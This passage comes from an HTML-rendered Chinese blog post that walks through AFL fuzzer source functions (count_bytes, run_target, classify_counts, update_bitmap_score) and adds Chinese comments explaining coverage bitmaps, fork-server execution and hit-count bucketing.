class="hljs-comment">           bytes in current[] are pristine in virgin[]. */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> WORD_SIZE_64</span><br><br>        <span class="hljs-keyword">if</span> ((cur[<span class="hljs-number">0</span>] &amp;&amp; vir[<span class="hljs-number">0</span>] == <span class="hljs-number">0xff</span>) || (cur[<span class="hljs-number">1</span>] &amp;&amp; vir[<span class="hljs-number">1</span>] == <span class="hljs-number">0xff</span>) ||<br>            (cur[<span class="hljs-number">2</span>] &amp;&amp; vir[<span class="hljs-number">2</span>] == <span class="hljs-number">0xff</span>) || (cur[<span class="hljs-number">3</span>] &amp;&amp; vir[<span class="hljs-number">3</span>] == <span class="hljs-number">0xff</span>) ||<br>            (cur[<span class="hljs-number">4</span>] &amp;&amp; vir[<span class="hljs-number">4</span>] == <span class="hljs-number">0xff</span>) || (cur[<span class="hljs-number">5</span>] &amp;&amp; vir[<span class="hljs-number">5</span>] == <span class="hljs-number">0xff</span>) ||<br>            (cur[<span class="hljs-number">6</span>] &amp;&amp; vir[<span class="hljs-number">6</span>] == <span class="hljs-number">0xff</span>) || (cur[<span class="hljs-number">7</span>] &amp;&amp; vir[<span class="hljs-number">7</span>] == <span class="hljs-number">0xff</span>)) ret = <span class="hljs-number">2</span>;  <span class="hljs-comment">// cur[i]不为空，vir[i]不变，代表发现了新路径</span><br>        <span class="hljs-keyword">else</span> ret = <span class="hljs-number">1</span>;   <span class="hljs-comment">// 代表改变了某个queue的命中次数</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br><br>        <span class="hljs-keyword">if</span> ((cur[<span class="hljs-number">0</span>] &amp;&amp; vir[<span class="hljs-number">0</span>] == <span class="hljs-number">0xff</span>) || (cur[<span class="hljs-number">1</span>] &amp;&amp; vir[<span class="hljs-number">1</span>] == <span class="hljs-number">0xff</span>) ||<br>            (cur[<span class="hljs-number">2</span>] &amp;&amp; vir[<span class="hljs-number">2</span>] == <span class="hljs-number">0xff</span>) || (cur[<span class="hljs-number">3</span>] &amp;&amp; vir[<span class="hljs-number">3</span>] == <span class="hljs-number">0xff</span>)) ret = <span class="hljs-number">2</span>;<br>        <span class="hljs-keyword">else</span> ret = <span class="hljs-number">1</span>;<br><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">/* ^WORD_SIZE_64 */</span></span><br><br>      &#125;<br><br>      *virgin &amp;= ~*current;     <span class="hljs-comment">// 设置virgin_map</span><br><br>    &#125;<br><br>    current++;<br>    virgin++;<br><br>  &#125;<br><br>  <span class="hljs-keyword">if</span> (ret &amp;&amp; virgin_map == virgin_bits) bitmap_changed = <span class="hljs-number">1</span>;     <span class="hljs-comment">// 若ret &gt; 0且virgin_map等于virgin_bits,设置bitmap_changed为1</span><br><br>  <span class="hljs-keyword">return</span> ret;<br><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="count-bytes"><a href="#count-bytes" class="headerlink" title="count_bytes"></a>count_bytes</h3><p>统计发现的路径个数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> FF(_b)  (0xff &lt;&lt; ((_b) &lt;&lt; 3))</span><br><br><span class="hljs-comment">/* Count the number of bytes set in the bitmap. Called fairly sporadically,</span><br><span class="hljs-comment">   mostly to update the status screen or calibrate and examine confirmed</span><br><span class="hljs-comment">   new paths. */</span><br><br><span class="hljs-type">static</span> u32 <span class="hljs-title function_">count_bytes</span><span class="hljs-params">(u8* mem)</span> &#123;<br><br>  u32* ptr = (u32*)mem;<br>  u32  i   = (MAP_SIZE &gt;&gt; <span class="hljs-number">2</span>);<br>  u32  ret = <span class="hljs-number">0</span>;<br><br>  <span class="hljs-keyword">while</span> (i--) &#123; <span class="hljs-comment">// 每次处理32位数据</span><br><br>    u32 v = *(ptr++);<br><br>    <span class="hljs-keyword">if</span> (!v) <span class="hljs-keyword">continue</span>;<br>    <span class="hljs-keyword">if</span> (v &amp; FF(<span class="hljs-number">0</span>)) ret++;       <span class="hljs-comment">// v &amp; 0xff</span><br>    <span class="hljs-keyword">if</span> (v &amp; FF(<span class="hljs-number">1</span>)) ret++;       <span class="hljs-comment">// v &amp; 0xff00</span><br>    <span class="hljs-keyword">if</span> (v &amp; FF(<span class="hljs-number">2</span>)) ret++;       <span class="hljs-comment">// v &amp; 0xff0000</span><br>    <span class="hljs-keyword">if</span> (v &amp; FF(<span class="hljs-number">3</span>)) ret++;       <span class="hljs-comment">// v &amp; 0xff000000</span><br><br>  &#125;<br><br>  <span class="hljs-keyword">return</span> ret;   <span class="hljs-comment">// 返回统计的路径数量</span><br><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="run-target"><a href="#run-target" class="headerlink" title="run_target"></a>run_target</h3><p>执行目标程序，并更新queue情况。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Execute target application, monitoring for timeouts. Return status</span><br><span class="hljs-comment">   information. The called program will update trace_bits[]. */</span><br><br><span class="hljs-type">static</span> u8 <span class="hljs-title function_">run_target</span><span class="hljs-params">(<span class="hljs-type">char</span>** argv, u32 timeout)</span> &#123;<br><br>  <span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">itimerval</span> <span class="hljs-title">it</span>;</span><br>  <span class="hljs-type">static</span> u32 prev_timed_out = <span class="hljs-number">0</span>;<br>  <span class="hljs-type">static</span> u64 exec_ms = <span class="hljs-number">0</span>;<br><br>  <span class="hljs-type">int</span> status = <span class="hljs-number">0</span>;<br>  u32 tb4;<br><br>  child_timed_out = <span class="hljs-number">0</span>;  <span class="hljs-comment">// 设置子进程超时时间</span><br><br>  <span class="hljs-comment">/* After this memset, trace_bits[] are effectively volatile, so we</span><br><span class="hljs-comment">     must prevent any earlier operations from venturing into that</span><br><span class="hljs-comment">     territory. */</span><br><br>  <span class="hljs-built_in">memset</span>(trace_bits, <span class="hljs-number">0</span>, MAP_SIZE);      <span class="hljs-comment">// 初始化trave_bits, 也即清空共享内存，0x10000</span><br>  MEM_BARRIER();<br><br>  <span class="hljs-comment">/* If we&#x27;re running in &quot;dumb&quot; mode, we can&#x27;t rely on the fork server</span><br><span class="hljs-comment">     logic compiled into the target program, so we will just keep calling</span><br><span class="hljs-comment">     execve(). There is a bit of code duplication between here and </span><br><span class="hljs-comment">     init_forkserver(), but c&#x27;est la vie. */</span><br><br>  <span class="hljs-keyword">if</span> (dumb_mode == <span class="hljs-number">1</span> || no_forkserver) &#123;        <span class="hljs-comment">// 如果是简易模式，或者no_forkserver，类似于init_forkserver流程，不再赘述</span><br><br>    child_pid = fork();<br><br>    <span class="hljs-keyword">if</span> (child_pid &lt; <span class="hljs-number">0</span>) PFATAL(<span class="hljs-string">&quot;fork() failed&quot;</span>);<br><br>    <span class="hljs-keyword">if</span> (!child_pid) &#123;<br><br>      <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">rlimit</span> <span class="hljs-title">r</span>;</span><br><br>      <span class="hljs-keyword">if</span> (mem_limit) &#123;<br><br>        r.rlim_max = r.rlim_cur = ((<span class="hljs-type">rlim_t</span>)mem_limit) &lt;&lt; <span class="hljs-number">20</span>;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> RLIMIT_AS</span><br><br>        setrlimit(RLIMIT_AS, &amp;r); <span class="hljs-comment">/* Ignore errors */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br><br>        setrlimit(RLIMIT_DATA, &amp;r); <span class="hljs-comment">/* Ignore errors */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">/* ^RLIMIT_AS */</span></span><br><br>      &#125;<br><br>      r.rlim_max = r.rlim_cur = <span class="hljs-number">0</span>;<br><br>      setrlimit(RLIMIT_CORE, &amp;r); <span class="hljs-comment">/* Ignore errors */</span><br><br>      <span class="hljs-comment">/* Isolate the process and configure standard descriptors. If out_file is</span><br><span class="hljs-comment">         specified, stdin is /dev/null; otherwise, out_fd is cloned instead. */</span><br><br>      setsid();<br><br>      dup2(dev_null_fd, <span class="hljs-number">1</span>);<br>      dup2(dev_null_fd, <span class="hljs-number">2</span>);<br><br>      <span class="hljs-keyword">if</span> (out_file) &#123;<br><br>        dup2(dev_null_fd, <span class="hljs-number">0</span>);<br><br>      &#125; <span class="hljs-keyword">else</span> &#123;<br><br>        dup2(out_fd, <span class="hljs-number">0</span>);<br>        close(out_fd);<br><br>      &#125;<br><br>      <span class="hljs-comment">/* On Linux, would be faster to use O_CLOEXEC. Maybe TODO. */</span><br><br>      close(dev_null_fd);<br>      close(out_dir_fd);<br>      close(dev_urandom_fd);<br>      close(fileno(plot_file));<br><br>      <span class="hljs-comment">/* Set sane defaults for ASAN if nothing else specified. */</span><br><br>      setenv(<span class="hljs-string">&quot;ASAN_OPTIONS&quot;</span>, <span class="hljs-string">&quot;abort_on_error=1:&quot;</span><br>                             <span class="hljs-string">&quot;detect_leaks=0:&quot;</span><br>                             <span class="hljs-string">&quot;symbolize=0:&quot;</span><br>                             <span class="hljs-string">&quot;allocator_may_return_null=1&quot;</span>, <span class="hljs-number">0</span>);<br><br>      setenv(<span class="hljs-string">&quot;MSAN_OPTIONS&quot;</span>, <span class="hljs-string">&quot;exit_code=&quot;</span> STRINGIFY(MSAN_ERROR) <span class="hljs-string">&quot;:&quot;</span><br>                             <span class="hljs-string">&quot;symbolize=0:&quot;</span><br>                             <span class="hljs-string">&quot;msan_track_origins=0&quot;</span>, <span class="hljs-number">0</span>);<br><br>      execv(target_path, argv);<br><br>      <span class="hljs-comment">/* Use a distinctive bitmap value to tell the parent about execv()</span><br><span class="hljs-comment">         falling through. */</span><br><br>      *(u32*)trace_bits = EXEC_FAIL_SIG;<br>      <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br><br>    &#125;<br><br>  &#125; <span class="hljs-keyword">else</span> &#123;      <span class="hljs-comment">// 执行到此，代表forkserver成功启动</span><br><br>    s32 res;<br><br>    <span class="hljs-comment">/* In non-dumb mode, we have the fork server up and running, so simply</span><br><span class="hljs-comment">       tell it to have at it, and then read back PID. */</span><br><br>    <span class="hljs-keyword">if</span> ((res = write(fsrv_ctl_fd, &amp;prev_timed_out, <span class="hljs-number">4</span>)) != <span class="hljs-number">4</span>) &#123;  <span class="hljs-comment">// 向fork server写入控制命令，表示启动目标程序</span><br><br>      <span class="hljs-keyword">if</span> (stop_soon) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  <span class="hljs-comment">// 若stop_soon不为空，直接返回</span><br>      RPFATAL(res, <span class="hljs-string">&quot;Unable to request new process from fork server (OOM?)&quot;</span>);<br><br>    &#125;<br><br>    <span class="hljs-keyword">if</span> ((res = read(fsrv_st_fd, &amp;child_pid, <span class="hljs-number">4</span>)) != <span class="hljs-number">4</span>) &#123; <span class="hljs-comment">// fork server返回子进程pid，读取管道中子进程pid</span><br><br>      <span class="hljs-keyword">if</span> (stop_soon) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  <span class="hljs-comment">// 若stop_soon不为空，直接返回</span><br>      RPFATAL(res, <span class="hljs-string">&quot;Unable to request new process from fork server (OOM?)&quot;</span>);<br><br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (child_pid &lt;= <span class="hljs-number">0</span>) FATAL(<span class="hljs-string">&quot;Fork server is misbehaving (OOM?)&quot;</span>);<br><br>  &#125;<br><br>  <span class="hljs-comment">/* Configure timeout, as requested by user, then wait for child to terminate. */</span><br>  <span class="hljs-comment">// 为目标程序设置计时器</span><br>  it.it_value.tv_sec = (timeout / <span class="hljs-number">1000</span>);<br>  it.it_value.tv_usec = (timeout % <span class="hljs-number">1000</span>) * <span class="hljs-number">1000</span>;<br><br>  setitimer(ITIMER_REAL, &amp;it, <span class="hljs-literal">NULL</span>);<br><br>  <span class="hljs-comment">/* The SIGALRM handler simply kills the child_pid and sets child_timed_out. */</span><br><br>  <span class="hljs-keyword">if</span> (dumb_mode == <span class="hljs-number">1</span> || no_forkserver) &#123;        <span class="hljs-comment">// 如果是简易模式，或者no_forkserver，等待子进程结束并获取status</span><br><br>    <span class="hljs-keyword">if</span> (waitpid(child_pid, &amp;status, <span class="hljs-number">0</span>) &lt;= <span class="hljs-number">0</span>) PFATAL(<span class="hljs-string">&quot;waitpid() failed&quot;</span>);<br><br>  &#125; <span class="hljs-keyword">else</span> &#123;      <span class="hljs-comment">// fork server模式下</span><br><br>    s32 res;<br><br>    <span class="hljs-keyword">if</span> ((res = read(fsrv_st_fd, &amp;status, <span class="hljs-number">4</span>)) != <span class="hljs-number">4</span>) &#123;    <span class="hljs-comment">// 从管道中获取子进程执行状态</span><br><br>      <span class="hljs-keyword">if</span> (stop_soon) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>      RPFATAL(res, <span class="hljs-string">&quot;Unable to communicate with fork server (OOM?)&quot;</span>);<br><br>    &#125;<br><br>  &#125;<br><br>  <span class="hljs-keyword">if</span> (!WIFSTOPPED(status)) child_pid = <span class="hljs-number">0</span>;     <span class="hljs-comment">// 判断子进程是否执行结束，设置child_pid为0  </span><br>  <br>  getitimer(ITIMER_REAL, &amp;it);<br>  exec_ms = (u64) timeout - (it.it_value.tv_sec * <span class="hljs-number">1000</span> +<br>                             it.it_value.tv_usec / <span class="hljs-number">1000</span>);<br>  <span class="hljs-comment">// 关闭计时器</span><br>  it.it_value.tv_sec = <span class="hljs-number">0</span>;<br>  it.it_value.tv_usec = <span class="hljs-number">0</span>;<br><br>  setitimer(ITIMER_REAL, &amp;it, <span class="hljs-literal">NULL</span>);<br><br>  total_execs++;        <span class="hljs-comment">// 执行次数 + 1</span><br><br>  <span class="hljs-comment">/* Any subsequent operations on trace_bits must not be moved by the</span><br><span class="hljs-comment">     compiler below this point. Past this location, trace_bits[] behave</span><br><span class="hljs-comment">     very normally and do not have to be treated as volatile. */</span><br><br>  MEM_BARRIER();<br><br>  tb4 = *(u32*)trace_bits;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> WORD_SIZE_64     <span class="hljs-comment">// 对trace_bit进行分类</span></span><br>  classify_counts((u64*)trace_bits);<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>  classify_counts((u32*)trace_bits);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">/* ^WORD_SIZE_64 */</span></span><br><br>  prev_timed_out = child_timed_out;     <span class="hljs-comment">// 设置prev_timed_out为child_timed_out</span><br><br>  <span class="hljs-comment">/* Report outcome to caller. */</span><br><br>  <span class="hljs-keyword">if</span> (WIFSIGNALED(status) &amp;&amp; !stop_soon) &#123;      <span class="hljs-comment">// 若为异常结束子进程状态，且stop_soon为空</span><br><br>    kill_signal = WTERMSIG(status);<br><br>    <span class="hljs-keyword">if</span> (child_timed_out &amp;&amp; kill_signal == SIGKILL) <span class="hljs-keyword">return</span> FAULT_TMOUT;<br><br>    <span class="hljs-keyword">return</span> FAULT_CRASH;<br><br>  &#125;<br><br>  <span class="hljs-comment">/* A somewhat nasty hack for MSAN, which doesn&#x27;t support abort_on_error and</span><br><span class="hljs-comment">     must use a special exit code. */</span><br>  <br>  <span class="hljs-comment">// 这是对MSAN的一种令人讨厌的攻击，它不支持abort_on_error，必须使用特殊的退出代码。</span><br>  <span class="hljs-keyword">if</span> (uses_asan &amp;&amp; WEXITSTATUS(status) == MSAN_ERROR) &#123;<br>    kill_signal = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">return</span> FAULT_CRASH;<br>  &#125;<br><br>  <span class="hljs-keyword">if</span> ((dumb_mode == <span class="hljs-number">1</span> || no_forkserver) &amp;&amp; tb4 == EXEC_FAIL_SIG)<br>    <span class="hljs-keyword">return</span> FAULT_ERROR;<br><br>  <span class="hljs-comment">/* It makes sense to account for the slowest units only if the testcase was run</span><br><span class="hljs-comment">  under the user defined timeout. */</span><br>  <span class="hljs-keyword">if</span> (!(timeout &gt; exec_tmout) &amp;&amp; (slowest_exec_ms &lt; exec_ms)) &#123;<br>    slowest_exec_ms = exec_ms;<br>  &#125;<br><br>  <span class="hljs-keyword">return</span> FAULT_NONE;<br><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="classify-counts"><a href="#classify-counts" class="headerlink" title="classify_counts"></a>classify_counts</h3><ul><li>具体地，target是将每个分支的执行次数用1个byte来储存，而fuzzer则进一步把这个执行次数归入到buckets中，举个例子，如果某分支执行了1次，那么落入第2个bucket，其计数byte仍为1；如果某分支执行了4次，那么落入第5个bucket，其计数byte将变为8，等等。</li><li>这样处理之后，对分支执行次数就会有一个简单的归类。例如，如果对某个测试用例处理时，分支A执行了32次；对另外一个测试用例，分支A执行了33次，那么AFL就会认为这两次的代码覆盖是相同的。当然，这样的简单分类肯定不能区分所有的情况，不过在某种程度上，处理了一些因为循环次数的微小区别，而误判为不同执行结果的情况.</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> WORD_SIZE_64</span><br><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> <span class="hljs-title function_">classify_counts</span><span class="hljs-params">(u64* mem)</span> &#123;<br><br>  u32 i = MAP_SIZE &gt;&gt; <span class="hljs-number">3</span>;<br><br>  <span class="hljs-keyword">while</span> (i--) &#123; <span class="hljs-comment">// 遍历trace_bits，对trace_bits进行归类</span><br><br>    <span class="hljs-comment">/* Optimize for sparse bitmaps. */</span><br><br>    <span class="hljs-keyword">if</span> (unlikely(*mem)) &#123;       <span class="hljs-comment">// 8个字节为一组执行，每次取两个字节</span><br><br>      u16* mem16 = (u16*)mem;<br><br>      mem16[<span class="hljs-number">0</span>] = count_class_lookup16[mem16[<span class="hljs-number">0</span>]];<br>      mem16[<span class="hljs-number">1</span>] = count_class_lookup16[mem16[<span class="hljs-number">1</span>]];<br>      mem16[<span class="hljs-number">2</span>] = count_class_lookup16[mem16[<span class="hljs-number">2</span>]];<br>      mem16[<span class="hljs-number">3</span>] = count_class_lookup16[mem16[<span class="hljs-number">3</span>]];<br><br>    &#125;<br><br>    mem++;<br><br>  &#125;<br><br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> <span class="hljs-title function_">classify_counts</span><span class="hljs-params">(u32* mem)</span> &#123;<br><br>  u32 i = MAP_SIZE &gt;&gt; <span class="hljs-number">2</span>;<br><br>  <span class="hljs-keyword">while</span> (i--) &#123;<span class="hljs-comment">// 遍历trace_bits，对trace_bits进行归类</span><br><br>    <span class="hljs-comment">/* Optimize for sparse bitmaps. */</span><br><br>    <span class="hljs-keyword">if</span> (unlikely(*mem)) &#123;<span class="hljs-comment">// 4个字节为一组执行，每次取两个字节</span><br><br>      u16* mem16 = (u16*)mem;<br><br>      mem16[<span class="hljs-number">0</span>] = count_class_lookup16[mem16[<span class="hljs-number">0</span>]];<br>      mem16[<span class="hljs-number">1</span>] = count_class_lookup16[mem16[<span class="hljs-number">1</span>]];<br><br>    &#125;<br><br>    mem++;<br><br>  &#125;<br><br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">/* ^WORD_SIZE_64 */</span></span><br></code></pre></td></tr></table></figure><h3 id="update-bitmap-score"><a href="#update-bitmap-score" class="headerlink" title="update_bitmap_score"></a>update_bitmap_score</h3><p>每当我们发现一个新的路径，都会调用这个函数来判断其是不是更加地favorable。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* When we bump into a new path, we call this to see if the path appears</span><br><span class="hljs-comment">   more &quot;favorable&quot; than any of the existing ones. The purpose of the</span><br><span class="hljs-comment">   &quot;favorables&quot; is to have a minimal set of paths that trigger all the bits</span><br><span class="hljs-comment">   seen in the bitmap so far, and focus on fuzzing them at the expense of</span><br><span class="hljs-comment">   the rest.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">   The first step of the process is to maintain a list of top_rated[] entries</span><br><span class="hljs-comment">   for every byte in the bitmap. We win that slot if there is no previous</span><br><span class="hljs-comment">   contender, or if the contender has a more favorable speed x size factor. */</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">update_bitmap_score</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> queue_entry* q)</span> &#123;<br><br>  u32 i;<br>  u64 fav_factor = q-&gt;exec_us * q-&gt;len;         <span class="hljs-comment">// 计算case的fav_factor</span><br><br>  <span class="hljs-comment">/* For every byte set in trace_bits[], see if there is a previous winner,</span><br><span class="hljs-comment">     and how it compares to us. */</span><br><br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; MAP_SIZE; i++)        <span class="hljs-comment">// 遍历trace_bits</span><br><br>    <span class="hljs-keyword">if</span> (trace_bits[i]) &#123;        <span class="hljs-comment">// 代表已经覆盖到的path</span><br><br>       <span class="hljs-keyword">if</span> (top_rated[i]) &#123;      <span class="hljs-comment">// 若top_tated[i]不为空</span><br><br>         <span class="hljs-comment">/* Faster-executing or smaller test cases are favored. */</span><br>        <br>         <span class="hljs-comment">// 若发现fav_factor大于原来top_tated的fav_factor，continue</span><br>         <span class="hljs-keyword">if</span> (fav_factor &gt; top_rated[i]-&gt;exec_us * top_rated[i]-&gt;len) <span class="hljs-keyword">continue</span>;<br><br>         <span class="hljs-comment">/* Looks like we&#x27;re going to win. Decrease ref count for the</span><br><span class="hljs-comment">            previous winner, discard its trace_bits[] if necessary. */</span><br>         <br>         <span class="hljs-comment">// fav_factor更小，表示更优，释放top_rated[i]-&gt;trace_mini</span><br>         <span class="hljs-keyword">if</span> (!--top_rated[i]-&gt;tc_ref) &#123;<br>           ck_free(top_rated[i]-&gt;trace_mini);<br>           top_rated[i]-&gt;trace_mini = <span 